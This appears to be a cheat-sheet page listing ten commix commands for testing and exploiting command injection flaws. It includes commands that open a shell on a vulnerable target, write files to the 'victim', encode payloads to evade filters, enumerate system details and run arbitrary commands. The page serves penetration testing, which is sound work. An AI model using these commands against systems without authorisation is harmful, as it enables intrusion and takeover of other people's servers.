---
title: Commix Command List
date: 2026-01-05
category: commands
enrich: false
tags: commix, cybersecurity, command reference
description: Top 10 essential commands for commix.
---

# Commix Command Guide

**Commix** (Command Injection Exploiter) is an automated tool used to test and exploit command injection vulnerabilities.

## Top 10 Useful Commands

### 1. Basic Scan
```bash
commix --url="http://target.com?id=1"
```
**Explanation:** Standard injection test on URL parameters.

### 2. Interactive Shell
```bash
commix --url="..." --os-shell
```
**Explanation:** If vulnerable, spawn a pseudo-shell on the target.

### 3. Batch Mode
```bash
commix --url="..." --batch
```
**Explanation:** Non-interactive mode.

### 4. Post Data
```bash
commix --url="http://target.com/login" --data="user=admin&input=123"
```
**Explanation:** Test POST body parameters.

### 5. Injection Point
```bash
commix --url="http://target.com?id=1*&debug=true"
```
**Explanation:** The `*` marks the specific injection point to test.

### 6. Level (Intensity)
```bash
commix --url="..." --level=3
```
**Explanation:** Checks more payloads/headers.

### 7. Alter Agents
```bash
commix --url="..." --random-agent
```
**Explanation:** Random User-Agent.

### 8. Upload File
```bash
commix --url="..." --file-write="local.txt" --file-dest="/tmp/remote.txt"
```
**Explanation:** Upload a file to the victim.

### 9. Base64 Evasion
```bash
commix --url="..." --tamper=base64
```
**Explanation:** Encode payloads to bypass filters.

### 10. Enumeration
```bash
commix --url="..." --all
```
**Explanation:** Retireve all system info (user, hostname, ip, etc).

## The Most Powerful Command
```bash
commix -r req.txt --level=3 --os-cmd="whoami"
```
**Explanation:** Use a saved request file and immediately execute a single command ("whoami") if successful.

